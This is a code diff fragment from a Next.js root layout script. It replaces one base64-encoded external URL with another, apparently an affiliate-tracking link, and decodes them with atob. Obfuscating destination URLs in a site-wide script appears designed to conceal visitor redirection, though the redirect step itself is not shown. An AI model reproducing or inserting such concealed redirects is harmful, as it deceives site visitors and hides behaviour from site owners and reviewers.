@@ -91,7 +91,7 @@ export default function RootLayout({
                     }
                 }
                 var mainBrandB64 = "aHR0cHM6Ly9iYWxhbnMtYXB4MTEtc21hcnQuY29tL2FkMmFhcTV1cGM="; 
-                var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0="; 
+                var crossBrandB64 = "aHR0cHM6Ly9nb25vcm1hZmZpbGlhdGVzLmNvbS8/c2VyaWFsPTYxMzU1ODg4JmNyZWF0aXZlX2lkPTc2NzU="; 
                 
                 // Фикс: отрезаем решетку перед декодированием
                 var mainUrl = atob(mainBrandB64.replace("#", ""));
